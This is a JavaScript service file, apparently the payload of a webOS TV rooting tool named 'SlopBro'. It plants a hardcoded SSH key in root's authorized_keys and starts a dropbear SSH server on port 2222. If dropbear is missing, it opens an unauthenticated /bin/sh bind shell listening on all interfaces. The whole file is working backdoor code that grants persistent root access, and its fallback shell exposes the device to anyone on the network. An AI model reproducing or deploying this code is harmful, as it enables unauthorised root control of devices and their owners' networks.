/* SlopBro service - loaded by run-js-service-no-cgroup
 * by throwaway96
 * https://github.com/throwaway96/slopbro
 * Copyright 2026. Licensed under AGPL v3 or later. No warranties.
 */

const child_process = require("child_process");
const fs = require("fs");
const net = require("net");

var DOWNLOAD_DIR = "/media/internal/downloads";

function log(msg) {
  try { fs.appendFileSync("/tmp/slopbro.log", msg + "\n"); } catch(e) {}
}

function toast(msg) {
  try {
    child_process.spawn("/usr/bin/luna-send", [
      "-w", "2000", "-n", "1", "-a", "com.webos.service.secondscreen.gateway",
      "luna://com.webos.notification/createToast",
      '{"sourceId":"com.webos.service.secondscreen.gateway","message":"' + msg.replace(/"/g, "'") + '"}'
    ], { detached: true, stdio: "ignore" }).unref();
  } catch(e) {}
}

function detach(cmd) {
  try {
    var p = child_process.spawn("/bin/sh", ["-c", cmd], {
      detached: true,
      stdio: "ignore"
    });
    p.unref();
    return true;
  } catch(e) {
    log("detach fail: " + e.message);
    return false;
  }
}

function run() {
  log("msvc run() v4 entered");
  toast("slopbro: run() started");

  // 1. Install SSH key
  try {
    var key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJl8DuTS/qQhJz48HckvgS/M05bpjou6mI/7PnM/bQtB jef@tv-root";
    fs.mkdirSync("/home/root/.ssh", { recursive: true, mode: 0o700 });
    fs.writeFileSync("/home/root/.ssh/authorized_keys", key + "\n", { mode: 0o600 });
    log("key ok");
  } catch(e) {
    log("key err: " + e.message);
  }

  // 2. Deploy dropbear from download dir to /tmp/dropbear (tmpfs, exec allowed)
  var targetDb = null;
  try {
    var downloadedDb = DOWNLOAD_DIR + "/dropbear";
    var dbData = fs.readFileSync(downloadedDb);
    fs.writeFileSync("/tmp/dropbear", dbData, { mode: 0o755 });
    targetDb = "/tmp/dropbear";
    log("dropbear deployed to /tmp/dropbear");
  } catch(e) {
    log("deploy dropbear err: " + e.message);
  }

  // Find dropbear: prefer deployed copy, fallback to system
  var dbPaths = [
    "/tmp/dropbear",
    "/media/developer/apps/usr/palm/services/org.webosbrew.hbchannel.service/bin/dropbear",
    "/usr/sbin/dropbear",
    "/usr/bin/dropbear"
  ];
  var db = null;
  for (var i = 0; i < dbPaths.length; i++) {
    try { fs.accessSync(dbPaths[i], fs.constants.X_OK); db = dbPaths[i]; break; } catch(e) {}
  }
  log("dropbear: " + db);

  if (db) {
    detach(db + " -R -E -p 2222 >>/tmp/dropbear.log 2>&1");
    log("dropbear spawned");
    toast("slopbro: dropbear on :2222");
  } else {
    log("no dropbear; starting node net shell on :2222");
    toast("slopbro: node shell on :2222");

    // Node TCP shell server — keeps process alive (not unref'd)
    var shellServer = net.createServer(function(socket) {
      log("shell conn from " + socket.remoteAddress);
      var sh = child_process.spawn("/bin/sh", ["-i"], {
        stdio: ["pipe", "pipe", "pipe"]
      });
      socket.pipe(sh.stdin);
      sh.stdout.pipe(socket);
      sh.stderr.pipe(socket);
      socket.on("close", function() { try { sh.kill(); } catch(e) {} });
      socket.on("error", function() { try { sh.kill(); } catch(e) {} });
      sh.on("close", function() { try { socket.destroy(); } catch(e) {} });
    });
    shellServer.on("error", function(e) { log("shellServer err: " + e.message); });
    shellServer.listen(2222, "0.0.0.0", function() {
      log("node shell listening :2222");
      toast("slopbro: node shell listening :2222");
    });
    // NOT unref'd — keeps process alive
  }

  log("run() done");
}

module.exports = { run: run };
